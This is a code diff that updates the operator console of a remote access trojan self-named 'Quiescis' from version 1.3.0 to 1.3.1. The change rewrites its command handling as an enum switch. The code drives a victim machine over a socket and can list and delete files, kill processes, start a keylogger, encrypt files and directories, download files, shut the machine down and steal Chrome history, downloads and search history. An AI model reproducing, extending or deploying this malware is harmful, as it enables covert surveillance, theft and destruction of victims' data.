@@ -1,5 +1,5 @@
 /*
- * Quiescis Remote Access Trojan 1.3.0
+ * Quiescis Remote Access Trojan 1.3.1
  * WARNING!
  * This software is the full property of the author
  * Copyright (c) 2020 by Nikait
@@ -25,10 +25,10 @@
 #endif
 
 
-
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <cstring>
 
 #include "Menu.h"
 #include "Config.h"
@@ -36,8 +36,13 @@
 
 
 char buffer[100000];
-std::string command, path, key;
+int command;
+std::string path, key;
+std::string temp_file_name;
 
+enum commands {
+	HELP = 1, CLOSE, PWD, LS, RM, RMDIR, INFO, PS, KILL, KEYLOGGER, CRYPTFILE, CRYPTDIR, DOWNLOAD, SHUTDOWN, ERR, CHROME_ST
+};
 
 int main() {
 #ifdef __linux__
@@ -52,8 +57,8 @@ int main() {
 #ifndef __linux__
 	WSAData wsaData;
 	WORD DLLVersion = MAKEWORD(2, 1);
-	if (WSAStartup(DLLVersion, &wsaData) != 0) {
-		std::cout << "Error WSAStartup\n";
+	if (WSAStartup(DLLVersion, &wsaData)) {
+		throw_error("Error WSAStartup");
 		exit(1);
 	}
 
@@ -110,10 +115,10 @@ int main() {
 	
 #endif
 
-	if (!conn) throw_error("accept < 1");
+	if (!conn) throw_error("accept error");
 	else {
 		timenow();
-		std::cout << " Sucessful Connected!\ntype help to print HELP [MENU]\n";
+		std::cout << " Sucessful Connected!\ntype 1 to print HELP [MENU]\n";
 		while (true) {
 			memset(&buffer, 0x0, sizeof(buffer));
 
@@ -126,74 +131,98 @@ int main() {
 #else
 			std::cout << " => ";
 #endif
-			std::getline(std::cin, command);
+			// get number from cin
+			std::string com_buf;
+			std::getline(std::cin, com_buf);
+			int num = parse(com_buf);
+			if (num) {
+				command = num;
+			} else {
+				const char* b = com_buf.c_str();
+				command = atoi(b);
+			}
+			switch (command) {
+			case HELP:
+				HelpMenu();
+				break;
 
-			if (command == "ls") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case CLOSE:
+				send(conn, "close", 5, NULL);
+				timenow();
+#ifndef __linux__
+				SetConsoleTextAttribute(hConsole, 12);
+				std::cout << " close connection\n";
+				SetConsoleTextAttribute(hConsole, 7);
+#else
+				std::cout << red << " close connection\n" << st_end;
+#endif
+				return 1;
+
+			case PWD:
+				send(conn, "pwd", 3, NULL);
+				recv(conn, buffer, sizeof(buffer), NULL);
+				std::cout << buffer << std::endl;
+				break;
+
+			case LS:
+				send(conn, "ls", 2, NULL);
 				std::cout << "enter path => ";
 				std::getline(std::cin, path);
 				send(conn, path.c_str(), sizeof(path), NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
+				break;
 
-			else if (command == "rm") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case RM:
+				send(conn, "rm", 2, NULL);
 				std::cout << "enter path => ";
 				std::getline(std::cin, path);
 				send(conn, path.c_str(), sizeof(path), NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
+				break;
 
-			else if (command == "rmdir") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case RMDIR:
+				send(conn, "rmdir", 5, NULL);
 				std::cout << "enter path => ";
 				std::getline(std::cin, path);
 				send(conn, path.c_str(), sizeof(path), NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
+				break;
 
-			else if (command == "info") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case INFO:
+				send(conn, "info", 4, NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
-
-			else if (command == "ps") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+				break;
+			case PS:
+				send(conn, "ps", 2, NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
+				break;
 
-			else if (command == "kill") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case KILL:
+				send(conn, "kill", 4, NULL);
 				std::cout << "enter name => ";
 				std::getline(std::cin, path);
 				send(conn, path.c_str(), sizeof(path), NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
+				break;
 
-			else if (command == "pwd") {
-				send(conn, command.c_str(), sizeof(command), NULL);
-				recv(conn, buffer, sizeof(buffer), NULL);
-				std::cout << buffer << std::endl;
-			}
-			
-			else if (command == "keylogger") {
-				send(conn, "keylogger", sizeof("keylogger"), NULL);
+			case KEYLOGGER:
+				send(conn, "keylogger", 9, NULL);
 				std::cout << "how many characters should record? => ";
 				std::getline(std::cin, path);
 				send(conn, path.c_str(), sizeof(path), NULL);
 				std::cout << "activate keylogger!\nwait ...\n";
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
+				break;
 
-			else if (command == "cryptfile") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case CRYPTFILE:
+				send(conn, "cryptfile", 9, NULL);
 				std::cout << "path to file => ";
 				std::getline(std::cin, path);
 				send(conn, path.c_str(), path.length(), NULL);
@@ -204,10 +233,10 @@ int main() {
 
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
+				break;
 
-			else if (command == "cryptdir") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case CRYPTDIR:
+				send(conn, "cryptdir", 8, NULL);
 				std::cout << "path to directory => ";
 				std::getline(std::cin, path);
 				send(conn, path.c_str(), path.length(), NULL);
@@ -217,19 +246,18 @@ int main() {
 				std::cout << "wait ...\n";
 				recv(conn, buffer, sizeof(buffer), NULL);
 				std::cout << buffer << std::endl;
-			}
+				break;
 
-			else if (command == "download") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case DOWNLOAD:
+				send(conn, "download", 8, NULL);
 				std::cout << "full path to file => ";
 				std::getline(std::cin, path);
 
 				// get file name
-				std::string temp_file_name;
 				for (unsigned int item = 0; item < path.length(); ++item) {
 					if ((path[item] == '\\') || (path[item] == '/')) {
 						temp_file_name = "";
-						for (unsigned int i = item+1; i < path.length(); ++i) {
+						for (unsigned int i = item + 1; i < path.length(); ++i) {
 							temp_file_name += path[i];
 						}
 					}
@@ -242,39 +270,37 @@ int main() {
 				// make the folder "downloads"
 				if (!dirExists("downloads"))
 #ifndef __linux__
-				 _wmkdir(L"downloads");
+					_wmkdir(L"downloads");
 #else
-				system("mkdir downloads");
+					system("mkdir downloads");
 #endif
 				if (!strcmp(buffer, "exist")) {
 					timenow();
 					std::cout << " file exist\n";
-				}
-				else {
+				} else {
 					std::ofstream wr("downloads\\" + temp_file_name, std::ios::binary);
 					wr << buffer;
 					timenow();
 					std::cout << " download: /downloads/" << temp_file_name << " succes\n";
 				}
-			}
+				break;
 
-			else if (command == "shutdown") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case SHUTDOWN:
+				send(conn, "shutdown", 8, NULL);
 				std::cout << "ok\n";
 				return 0;
-			}
 
-			else if (command == "error") {
-				send(conn, command.c_str(), sizeof(command), NULL);
+			case ERR:
+				send(conn, "error", 5, NULL);
 				std::cout << "enter name error => ";
 				std::getline(std::cin, path);
 				send(conn, path.c_str(), sizeof(path), NULL);
 				std::cout << "ok\n";
-			}
+				break;
 
-			else if (command == "chrome_st") {
+			case CHROME_ST:
 #if chrome_stealer
-				send(conn, command.c_str(), sizeof(command), NULL);
+				send(conn, "chrome_st", 9, NULL);
 				recv(conn, buffer, sizeof(buffer), NULL);
 
 				if (!dirExists("chrome")) _wmkdir(L"chrome");
@@ -285,11 +311,12 @@ int main() {
 					timenow();
 					std::cout << " history write chrome\\history.txt" << std::endl;
 					history.close();
-				} else {
+				}
+				else {
 					timenow();
 					std::cout << " null history";
 				}
-				
+
 				Sleep(1000);
 
 				memset(&buffer, 0x0, sizeof(buffer));
@@ -300,7 +327,8 @@ int main() {
 					timenow();
 					std::cout << " downloads write chrome\\downloads.txt" << std::endl;
 					downloads.close();
-				} else {
+				}
+				else {
 					timenow();
 					std::cout << " null downloads";
 				}
@@ -315,33 +343,20 @@ int main() {
 					timenow();
 					std::cout << " search_history write chrome\\search_history.txt" << std::endl;
 					requests.close();
-				} else {
+				}
+				else {
 					timenow();
 					std::cout << " null search_history";
 				}
 #else
 				std::cout << "not supported\n";
 #endif // chrome_stealer
+				break;
+
+			default:
+				std::cout << "not supported\n";
 			}
-
-			else if (command == "close") {
-				send(conn, command.c_str(), sizeof(command), NULL);
-				timenow();
-#ifndef __linux__
-				SetConsoleTextAttribute(hConsole, 12);
-				std::cout << " close connection\n";
-				SetConsoleTextAttribute(hConsole, 7);
-#else
-				std::cout << red << " close connection\n" << st_end;
-#endif
-				return 1;
-			}
-
-			else if (command == "help") HelpMenu();
-
-			else std::cout << "command not found\n";
 		}
 	}
 	return 0;
 }
-
